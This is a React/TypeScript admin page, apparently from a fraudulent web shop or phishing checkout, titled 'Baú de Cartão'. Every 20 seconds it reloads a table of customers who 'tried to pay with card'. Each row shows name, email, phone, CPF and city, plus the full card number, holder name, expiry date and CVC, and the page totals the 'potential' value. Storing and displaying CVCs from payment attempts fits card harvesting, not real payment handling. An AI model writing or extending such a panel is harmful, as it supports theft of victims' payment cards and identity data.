import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { adminCards } from "@/lib/admin.functions";

export const Route = createFileRoute("/admin/cards")({
  component: CardsPage,
});

const fmtBRL = (c: number | null) => c == null ? "—" : (c / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
const fmtDate = (s: string) => new Date(s).toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });

function CardsPage() {
  const fn = useServerFn(adminCards);
  const [rows, setRows] = useState<any[]>([]);

  useEffect(() => {
    const load = () => fn({}).then((r) => setRows(r.rows)).catch(() => {});
    load();
    const i = setInterval(load, 20000);
    return () => clearInterval(i);
  }, [fn]);

  const totalValue = rows.reduce((a, r) => a + (r.amount_cents || 0), 0);

  return (
    <div className="p-8 max-w-[1400px]">
      <h1 className="text-2xl font-semibold text-neutral-900">Baú de Cartão</h1>
      <p className="text-sm text-neutral-500 mt-0.5 mb-6">
        Clientes que tentaram pagar com cartão · {rows.length} tentativa(s) · {fmtBRL(totalValue)} em potencial
      </p>

      <div className="bg-white border border-neutral-200 rounded-lg overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead className="bg-neutral-50 border-b border-neutral-200">
              <tr className="text-left text-xs uppercase tracking-wider text-neutral-500">
                <th className="px-4 py-3">Data</th>
                <th className="px-4 py-3">Cliente</th>
                <th className="px-4 py-3">Contato</th>
                <th className="px-4 py-3">CPF</th>
                <th className="px-4 py-3">Cartão</th>
                <th className="px-4 py-3">Cidade/UF</th>
                <th className="px-4 py-3 text-right">Valor</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-100">
              {rows.length === 0 && (
                <tr><td colSpan={7} className="px-4 py-10 text-center text-neutral-400">Nenhuma tentativa ainda.</td></tr>
              )}
              {rows.map((r) => (
                <tr key={r.id} className="hover:bg-neutral-50 align-top">
                  <td className="px-4 py-3 text-neutral-700 whitespace-nowrap">{fmtDate(r.created_at)}</td>
                  <td className="px-4 py-3 font-medium text-neutral-900">{r.customer_name}</td>
                  <td className="px-4 py-3 text-neutral-600">
                    <div>{r.customer_email}</div>
                    <div className="text-xs text-neutral-500">{r.customer_phone}</div>
                  </td>
                  <td className="px-4 py-3 text-neutral-600">{r.customer_cpf}</td>
                  <td className="px-4 py-3 text-neutral-700 font-mono text-xs whitespace-nowrap">
                    {r.card_number ? (
                      <div className="space-y-0.5">
                        <div>{r.card_number}</div>
                        <div className="text-neutral-500">{r.card_holder}</div>
                        <div className="text-neutral-500">Val: {r.card_exp} · CVC: {r.card_cvc}</div>
                      </div>
                    ) : "—"}
                  </td>
                  <td className="px-4 py-3 text-neutral-600">
                    {r.address?.city ? `${r.address.city}/${r.address.state ?? ""}` : "—"}
                  </td>
                  <td className="px-4 py-3 text-right font-medium whitespace-nowrap">{fmtBRL(r.amount_cents)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
